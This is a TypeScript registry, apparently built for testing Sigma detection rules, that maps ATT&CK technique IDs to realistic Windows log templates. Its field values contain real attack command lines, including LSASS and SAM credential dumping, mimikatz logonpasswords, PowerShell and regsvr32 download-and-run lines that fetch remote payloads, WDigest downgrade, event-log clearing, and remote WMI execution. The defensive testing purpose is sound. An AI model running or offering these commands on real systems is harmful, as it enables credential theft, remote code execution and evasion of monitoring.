/**
 * Technique-aware log template registry.
 *
 * Maps ATT&CK technique IDs to arrays of realistic log templates sourced
 * from OTRF attack data analysis. These templates represent what attacks
 * ACTUALLY look like in telemetry — NOT derived from Sigma rule detection
 * values (which would create circular/tautological testing).
 *
 * Each template covers a different real-world variant of the technique.
 */

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface TechniqueLogTemplate {
  /** Sigma logsource category this template represents */
  category: string;
  /** Short human-readable description of the attack variant */
  description: string;
  /** Realistic field values as they appear in real attack telemetry */
  fields: Record<string, string | number | boolean>;
}

// ---------------------------------------------------------------------------
// Template Registry
// ---------------------------------------------------------------------------

export const TECHNIQUE_TEMPLATES: ReadonlyMap<string, TechniqueLogTemplate[]> = new Map<string, TechniqueLogTemplate[]>([
  // --- T1003.001: LSASS Memory Credential Dumping ---
  ['T1003.001', [
    {
      category: 'process_creation',
      description: 'comsvcs.dll MiniDump via rundll32',
      fields: {
        Image: 'C:\\Windows\\System32\\rundll32.exe',
        CommandLine: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\out.dmp full',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
    {
      category: 'process_creation',
      description: 'procdump targeting lsass',
      fields: {
        Image: 'C:\\tools\\procdump64.exe',
        CommandLine: 'procdump64.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
    {
      category: 'process_access',
      description: 'Task Manager accessing lsass memory',
      fields: {
        SourceImage: 'C:\\Windows\\System32\\Taskmgr.exe',
        TargetImage: 'C:\\Windows\\System32\\lsass.exe',
        GrantedAccess: '0x1fffff',
      },
    },
    {
      category: 'process_creation',
      description: 'encoded PowerShell Empire stager for credential access',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe -noP -sta -w 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=',
        ParentImage: 'C:\\Windows\\System32\\services.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
    {
      category: 'process_access',
      description: 'direct lsass memory read with suspicious access mask',
      fields: {
        SourceImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        TargetImage: 'C:\\Windows\\System32\\lsass.exe',
        GrantedAccess: '0x1010',
        CallTrace: 'C:\\Windows\\SYSTEM32\\ntdll.dll+9d4e4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|UNKNOWN(00000000)',
      },
    },
    {
      category: 'process_access',
      description: 'Dumpert direct syscall LSASS access (no CallTrace — bypasses it)',
      fields: {
        SourceImage: 'C:\\Users\\wardog\\Desktop\\Outflank-Dumpert.exe',
        TargetImage: 'C:\\Windows\\System32\\lsass.exe',
        GrantedAccess: '0x1fffff',
      },
    },
  ]],

  // --- T1003.003: NTDS.DIT Extraction ---
  ['T1003.003', [
    {
      category: 'process_creation',
      description: 'ntdsutil IFM creation',
      fields: {
        Image: 'C:\\Windows\\System32\\ntdsutil.exe',
        CommandLine: 'ntdsutil "ac i ntds" "ifm" "create full C:\\temp" q q',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'YOURFOREST\\pgustavo',
      },
    },
    {
      category: 'process_creation',
      description: 'vssadmin shadow copy for NTDS',
      fields: {
        Image: 'C:\\Windows\\System32\\vssadmin.exe',
        CommandLine: 'vssadmin create shadow /for=C:',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'YOURFOREST\\pgustavo',
      },
    },
  ]],

  // --- T1003.002: SAM Registry Dump ---
  ['T1003.002', [
    {
      category: 'process_creation',
      description: 'reg save SAM hive',
      fields: {
        Image: 'C:\\Windows\\System32\\reg.exe',
        CommandLine: 'reg save HKLM\\sam sam',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'YOURFOREST\\pgustavo',
      },
    },
    {
      category: 'process_creation',
      description: 'reg save SYSTEM hive',
      fields: {
        Image: 'C:\\Windows\\System32\\reg.exe',
        CommandLine: 'reg save HKLM\\system system',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'YOURFOREST\\pgustavo',
      },
    },
    {
      category: 'process_creation',
      description: 'reg save SECURITY hive (LSA secrets)',
      fields: {
        Image: 'C:\\Windows\\System32\\reg.exe',
        CommandLine: 'reg save HKLM\\security security',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'YOURFOREST\\pgustavo',
      },
    },
  ]],

  // --- T1003.006: DCSync ---
  ['T1003.006', [
    {
      category: 'network_connection',
      description: 'DRSUAPI replication via PowerShell (Empire DCSync)',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        DestinationPort: 389,
        DestinationIp: '172.18.39.5',
        SourceIp: '172.18.39.6',
        Initiated: true,
      },
    },
  ]],

  // --- T1059.001: PowerShell Execution ---
  ['T1059.001', [
    {
      category: 'process_creation',
      description: 'encoded PowerShell download cradle',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe -noP -sta -w 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
        ParentImage: 'C:\\Windows\\System32\\services.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
    {
      category: 'process_creation',
      description: 'child process with encoded parent',
      fields: {
        Image: 'C:\\Windows\\System32\\cmd.exe',
        CommandLine: 'cmd.exe /c whoami',
        ParentImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        ParentCommandLine: 'powershell.exe -noP -sta -w 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATw==',
        User: 'WORKGROUP\\wardog',
      },
    },
    {
      category: 'process_creation',
      description: 'PowerShell HTTP listener',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.1.1/payload\')"',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1055: Process Injection ---
  ['T1055', [
    {
      category: 'create_remote_thread',
      description: 'CreateRemoteThread into notepad (DLL injection)',
      fields: {
        SourceImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        TargetImage: 'C:\\Windows\\System32\\notepad.exe',
        StartFunction: 'LoadLibraryA',
        StartModule: '',
      },
    },
    {
      category: 'process_creation',
      description: 'process herpaderping mimikatz disguised',
      fields: {
        Image: 'C:\\Users\\wardog\\Desktop\\mimiexplorer.exe',
        CommandLine: 'C:\\Users\\wardog\\Desktop\\mimiexplorer.exe',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1055.001: DLL Injection ---
  ['T1055.001', [
    {
      category: 'create_remote_thread',
      description: 'Empire DLL injection via LoadLibrary + CreateRemoteThread',
      fields: {
        SourceImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        TargetImage: 'C:\\Windows\\System32\\notepad.exe',
        StartFunction: 'LoadLibraryA',
      },
    },
  ]],

  // --- T1547.001: Registry Run Keys ---
  ['T1547.001', [
    {
      category: 'registry_event',
      description: 'Empire persistence via user Run key',
      fields: {
        EventType: 'SetValue',
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        TargetObject: 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater',
        Details: 'C:\\Users\\wardog\\AppData\\Local\\Temp\\updater.vbs',
      },
    },
    {
      category: 'registry_event',
      description: 'Empire persistence via machine Run key (elevated)',
      fields: {
        EventType: 'SetValue',
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        TargetObject: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater',
        Details: 'C:\\Windows\\Temp\\updater.vbs',
      },
    },
  ]],

  // --- T1053.005: Scheduled Tasks ---
  ['T1053.005', [
    {
      category: 'process_creation',
      description: 'schtasks creation for persistence',
      fields: {
        Image: 'C:\\Windows\\System32\\schtasks.exe',
        CommandLine: 'schtasks /Create /SC DAILY /TN "Updater" /TR "powershell.exe -enc SQBFAFgA" /ST 09:00',
        ParentImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1021.002: SMB/Windows Admin Shares ---
  ['T1021.002', [
    {
      category: 'process_creation',
      description: 'Empire SMBExec spawning services.exe -> cmd.exe',
      fields: {
        Image: 'C:\\Windows\\System32\\cmd.exe',
        CommandLine: 'cmd.exe /Q /c echo cGluZyAxMjcuMC4wLjE= ^> C:\\Windows\\Temp\\output.txt',
        ParentImage: 'C:\\Windows\\System32\\services.exe',
        User: 'NT AUTHORITY\\SYSTEM',
      },
    },
    {
      category: 'network_connection',
      description: 'outbound SMB connection for lateral movement',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        DestinationPort: 445,
        DestinationIp: '172.18.39.6',
        Initiated: true,
      },
    },
  ]],

  // --- T1036: Masquerading ---
  ['T1036', [
    {
      category: 'process_creation',
      description: 'renamed executable with OriginalFileName mismatch',
      fields: {
        Image: 'C:\\Users\\wardog\\Desktop\\svchost.exe',
        OriginalFileName: 'mimikatz.exe',
        CommandLine: 'svchost.exe "privilege::debug" "sekurlsa::logonpasswords"',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
      },
    },
  ]],

  // --- T1082: System Information Discovery ---
  ['T1082', [
    {
      category: 'process_creation',
      description: 'systeminfo execution',
      fields: {
        Image: 'C:\\Windows\\System32\\systeminfo.exe',
        CommandLine: 'systeminfo',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1018: Remote System Discovery ---
  ['T1018', [
    {
      category: 'process_creation',
      description: 'Seatbelt group/user enumeration',
      fields: {
        Image: 'C:\\Users\\wardog\\Desktop\\Seatbelt.exe',
        CommandLine: 'Seatbelt.exe group user',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1135: Network Share Discovery ---
  ['T1135', [
    {
      category: 'process_creation',
      description: 'Empire Find-LocalAdminAccess',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe -exec bypass -c "Find-LocalAdminAccess"',
        ParentImage: 'C:\\Windows\\System32\\services.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1218.005: MSHTA ---
  ['T1218.005', [
    {
      category: 'process_creation',
      description: 'mshta executing VBScript to spawn PowerShell',
      fields: {
        Image: 'C:\\Windows\\System32\\mshta.exe',
        CommandLine: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc SQBFAFgA"", 0:close")',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
    {
      category: 'process_creation',
      description: 'PowerShell child spawned by mshta',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
        ParentImage: 'C:\\Windows\\System32\\mshta.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1218.003: CMSTP ---
  ['T1218.003', [
    {
      category: 'process_creation',
      description: 'CMSTP UAC bypass execution',
      fields: {
        Image: 'C:\\Windows\\System32\\cmstp.exe',
        CommandLine: 'cmstp.exe /ni /s C:\\Users\\wardog\\AppData\\Local\\Temp\\XKNqbpzl.txt',
        ParentImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1562.001: Disable Security Tools ---
  ['T1562.001', [
    {
      category: 'process_creation',
      description: 'PowerShell disabling EventLog service',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe Set-Service -Name EventLog -StartupType Disabled',
        ParentImage: 'C:\\Windows\\System32\\services.exe',
        User: 'NT AUTHORITY\\SYSTEM',
      },
    },
    {
      category: 'process_creation',
      description: 'PowerShell stopping EventLog service',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe Stop-Service -Name EventLog -Force',
        ParentImage: 'C:\\Windows\\System32\\services.exe',
        User: 'NT AUTHORITY\\SYSTEM',
      },
    },
  ]],

  // --- T1112: Registry Modification ---
  ['T1112', [
    {
      category: 'registry_event',
      description: 'WDigest UseLogonCredential downgrade',
      fields: {
        EventType: 'SetValue',
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        TargetObject: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential',
        Details: 'DWORD (0x00000001)',
      },
    },
  ]],

  // --- T1047: Windows Management Instrumentation ---
  ['T1047', [
    {
      category: 'process_creation',
      description: 'wmiprvse spawning cmd.exe (WMI lateral execution)',
      fields: {
        Image: 'C:\\Windows\\System32\\cmd.exe',
        CommandLine: 'cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__wmiclient 2>&1',
        ParentImage: 'C:\\Windows\\System32\\wbem\\wmiprvse.exe',
        User: 'NT AUTHORITY\\NETWORK SERVICE',
      },
    },
    {
      category: 'process_creation',
      description: 'wmic process call create for remote execution',
      fields: {
        Image: 'C:\\Windows\\System32\\wbem\\WMIC.exe',
        CommandLine: 'wmic /node:172.18.39.6 process call create "cmd.exe /c whoami > C:\\temp\\out.txt"',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'YOURFOREST\\pgustavo',
      },
    },
  ]],

  // --- T1070.001: Indicator Removal — Clear Event Logs ---
  ['T1070.001', [
    {
      category: 'process_creation',
      description: 'wevtutil clearing Security event log',
      fields: {
        Image: 'C:\\Windows\\System32\\wevtutil.exe',
        CommandLine: 'wevtutil cl Security',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'NT AUTHORITY\\SYSTEM',
      },
    },
    {
      category: 'process_creation',
      description: 'PowerShell Clear-EventLog for System log',
      fields: {
        Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        CommandLine: 'powershell.exe -Command "Clear-EventLog -LogName System"',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'NT AUTHORITY\\SYSTEM',
      },
    },
  ]],

  // --- T1218.010: Regsvr32 Proxy Execution ---
  ['T1218.010', [
    {
      category: 'process_creation',
      description: 'regsvr32 Squiblydoo COM scriptlet execution',
      fields: {
        Image: 'C:\\Windows\\System32\\regsvr32.exe',
        CommandLine: 'regsvr32 /s /n /u /i:http://172.18.39.6:8080/payload.sct scrobj.dll',
        ParentImage: 'C:\\Windows\\System32\\cmd.exe',
        User: 'WORKGROUP\\wardog',
      },
    },
  ]],

  // --- T1569.002: System Services — Service Execution ---
  ['T1569.002', [
    {
      category: 'process_creation',
      description: 'services.exe spawning cmd.exe shell (service-based execution)',
      fields: {
        Image: 'C:\\Windows\\System32\\cmd.exe',
        CommandLine: 'cmd.exe /c echo cGluZyAxMjcuMC4wLjE= ^> C:\\Windows\\Temp\\output.txt',
        ParentImage: 'C:\\Windows\\System32\\services.exe',
        User: 'NT AUTHORITY\\SYSTEM',
      },
    },
  ]],
]);

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Get technique log templates for a given ATT&CK technique ID.
 *
 * Checks exact match first, then parent technique.
 * Returns templates filtered to the specified logsource category (if given).
 */
export function getTemplatesForTechnique(
  techniqueId: string,
  category?: string,
): TechniqueLogTemplate[] {
  const upper = techniqueId.toUpperCase();

  // Try exact match first
  let templates = TECHNIQUE_TEMPLATES.get(upper);

  // Fall back to parent technique
  if (!templates && upper.includes('.')) {
    templates = TECHNIQUE_TEMPLATES.get(upper.split('.')[0]);
  }

  if (!templates) return [];

  // Filter to category if specified
  if (category) {
    return templates.filter((t) => t.category === category);
  }

  return [...templates];
}
